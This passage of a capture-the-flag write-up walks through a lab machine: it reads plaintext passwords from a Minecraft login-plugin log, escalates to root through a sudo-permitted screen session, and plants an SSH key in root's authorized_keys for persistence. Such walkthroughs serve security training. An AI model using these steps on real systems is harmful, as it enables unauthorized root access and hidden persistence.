Will remove the whitelist soon.

xxultimatecreeperxx@cybercrafted:~$ cat /opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123

[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!

xxultimatecreeperxx@cybercrafted:~$ su cybercrafted
Password: JavaEdition>Bedrock

cybercrafted@cybercrafted:/home/xxultimatecreeperxx$ cd /home/cybercrafted/
cybercrafted@cybercrafted:~$ ls -lsa
total 32
4 drwxr-x--- 4 cybercrafted cybercrafted 4096 Sep 12  2021 .
4 drwxr-xr-x 4 root         root         4096 Jun 27  2021 ..
0 lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
4 -rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
4 -rwxr-x--- 1 cybercrafted cybercrafted 3771 Jun 27  2021 .bashrc
4 drwx------ 2 cybercrafted cybercrafted 4096 Sep 12  2021 .cache
4 drwx------ 3 cybercrafted cybercrafted 4096 Sep 12  2021 .gnupg
4 -rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
4 -rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt

cybercrafted@cybercrafted:~$ 
```

`ssh cybercrafted@cybercrafted.thm -p 22`

```jsx
cybercrafted@cybercrafted.thm's password: JavaEdition>Bedrock

cybercrafted@cybercrafted:~$ whoami
cybercrafted
cybercrafted@cybercrafted:~$ id
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)
cybercrafted@cybercrafted:~$ groups
cybercrafted
cybercrafted@cybercrafted:~$ 

```

> **Privilege Escalation with Internal Logic & Screen Binary Phase**
> 

**For more information:**

[How To Use Linux Screen](https://linuxize.com/post/how-to-use-linux-screen/)

[screen
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/screen/)

```jsx
cybercrafted@cybercrafted:~$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 117880 Mar 26  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 436552 Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: JavaEdition>Bedrock

Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
    
cybercrafted@cybercrafted:~$ file /usr/bin/screen
/usr/bin/screen: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a5022bd25aafa4fbc4ffae81e7a5366aa19147c, stripped

cybercrafted@cybercrafted:~$ /usr/bin/screen -r cybercrafted

> help

[REDACTED] - MORE

[12:58:13 INFO]: /tp: Teleports the given player (or yourself) to another player or coordinates
[12:58:13 INFO]: /unregister: 
[12:58:13 INFO]: /version: Gets the version of this server including any plugins in use
[12:58:13 INFO]: /weather: Changes the weather
[12:58:13 INFO]: /whitelist: Manages the list of players allowed to use this server
[12:58:13 INFO]: /xp: Gives the specified player a certain amount of experience. Specify <amount>L to give levels instead, with a negative amount resulting in taking levels.

[REDACTED] - MORE

> ^A+C

# whoami
root
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# pwd
/opt/minecraft/cybercrafted
# cd root
# ls -lsa .ssh
4 drwx------ 2 root root 4096 Jun 27  2021 .
4 drwx------ 6 root root 4096 Oct 15  2021 ..
4 -rw------- 1 root root  399 Jun 27  2021 authorized_keys

# 
```

`cat /root/.ssh/id_rsa.pub`

```jsx
ssh-rsa [REDACTED] - SECRET root@kali
```

```jsx
# echo 'ssh-rsa [REDACTED] - SECRET root@kali' >> .ssh/authorized_keys
# 
```

`ssh root@cybercrafted.thm -p 22`

```jsx
root@cybercrafted:~# whoami
root
root@cybercrafted:~# 
```

# Appendix

## Screen

<aside>
💡

/usr/bin/screen is the executable for the GNU Screen utility on Unix-like operating systems. GNU Screen is a terminal multiplexer that allows users to manage multiple terminal sessions from a single window. It's particularly useful for managing long-running processes or working remotely, as it lets you detach and reattach terminal sessions without disrupting the processes running in them.

</aside>